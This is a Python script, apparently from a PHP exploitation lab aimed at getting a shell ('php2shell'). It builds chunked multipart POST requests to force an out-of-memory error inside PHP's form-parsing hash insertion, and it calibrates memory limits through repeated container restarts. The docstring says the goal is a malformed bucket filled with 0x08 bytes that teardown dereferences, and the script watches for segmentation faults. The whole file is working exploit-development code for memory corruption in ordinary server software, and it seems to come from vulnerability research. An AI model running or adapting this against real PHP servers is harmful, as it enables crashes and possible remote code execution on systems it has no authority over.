#!/usr/bin/env python3
"""php2shell lab, oom11: reach the wall MID-key-run.

oom10 dbg evidence: strike hits peak == memory_limit EXACTLY as the parts cap
ends the parse -> wall arrives at run-end, not mid-run. Fix: KEYVAL 2048 ->
per-key consumption 4KB -> wall at ~key 130/521 -> crossing INSIDE the run.
G sweep (256B steps) then slides the wall across value/param/key alloc slices;
a strike with fatal alloc ~328 = OOM inside add_to_hash AFTER nNumUsed++
-> malformed bucket filled with 0x08 -> teardown derefs 0x0808080808080808.
"""

import re
import socket
import subprocess
import sys
import time

HOST = "127.0.0.1"
BOUNDARY = "b" + "X" * 20
POISON = b"\x08"
UNIT = 128 * 1024
KEYVAL = 2048
KEYRUN = 3000
BIGFREE = 256 * 1024


def part(name: bytes, value: bytes) -> bytes:
    head = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="'
    ).encode() + name + b'"\r\n\r\n'
    return head + value + b"\r\n"


def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True, timeout=60)
    time.sleep(1.5)


def send(port: int, parts: list[bytes], path: str = "index.php") -> tuple[bool, str]:
    body = b"".join(parts) + b"--" + BOUNDARY.encode() + b"--\r\n"
    s = socket.create_connection((HOST, port), timeout=300)
    s.sendall(
        (
            f"POST /{path} HTTP/1.1\r\nHost: {HOST}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
            f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
        ).encode()
    )
    for i in range(0, len(body), 65536):
        c = body[i:i + 65536]
        s.sendall(f"{len(c):x}\r\n".encode() + c + b"\r\n")
    s.sendall(b"0\r\n\r\n")
    resp = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        resp += d
    s.close()
    t = resp.decode("utf-8", "replace")
    return ("Fatal error" in t), t


def fatal_n(text: str):
    m = re.search(r"tried to allocate (\d+) bytes", text)
    return int(m.group(1)) if m else None


def build(fill_units: int, rem: int, keyrun: int = 0) -> list[bytes]:
    big = POISON * BIGFREE
    ps = [part(b"b0", big), part(b"b0", big)]
    fill = POISON * UNIT
    for i in range(fill_units):
        ps.append(part(b"u%d" % i, fill))
    if rem > 0:
        ps.append(part(b"r", POISON * rem))
    kv = POISON * KEYVAL
    for k in range(keyrun):
        ps.append(part(POISON * (300 + k), kv))
    return ps


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
    log = lambda *a: print(*a, flush=True)

    a, b = 300, 520
    u_ok = None
    while a <= b:
        mid = (a + b) // 2
        restart()
        fatal, _ = send(port, build(mid, 0))
        log(f"cal units={mid}: fatal={fatal}")
        if fatal:
            b = mid - 1
        else:
            u_ok = mid
            a = mid + 1
    a, b = 0, UNIT
    r_ok = 0
    while a <= b:
        mid = (a + b) // 2
        restart()
        fatal, _ = send(port, build(u_ok, mid))
        log(f"cal rem={mid}: fatal={fatal}")
        if fatal:
            b = mid - 1
        else:
            r_ok = mid
            a = mid + 1
    log(f"edge: {u_ok} units + rem {r_ok}")

    # key run at full calibrated fill: wall must land mid-run now
    # fine sweep: shrink rem in 256B steps, watching the fatal alloc class
    results = []
    for d in range(0, 65537, 256):
        r = r_ok - d
        if r < 0:
            break
        restart()
        fatal, text = send(port, build(u_ok, r, keyrun=KEYRUN))
        n = fatal_n(text) if fatal else None
        tag = "  *** KEY/HASH CROSSING ***" if (fatal and n and n < 428) else ""
        log(f"sweep d={d}: fatal={fatal} alloc={n}{tag}")
        if tag:
            log(text[:300])
            results.append((d, n))
            break
        if fatal and n:
            results.append((d, n))
            if len(results) >= 3:
                break
    log("done — check error.log for 'exit signal Segmentation'")


if __name__ == "__main__":
    main()
